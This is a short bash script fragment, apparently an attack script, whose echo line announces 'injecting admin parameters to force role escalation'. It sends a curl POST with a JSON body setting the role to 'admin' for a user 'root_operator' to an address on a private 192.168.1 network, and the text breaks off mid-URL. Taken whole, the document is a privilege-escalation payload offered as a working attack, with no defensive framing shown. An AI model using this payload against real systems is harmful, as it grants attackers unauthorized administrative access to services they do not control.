#!/bin/bash
echo "[*] Injecting admin parameters to force role escalation..."
curl -i -X POST \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "user": "root_operator"}' \
  http://192.168.1
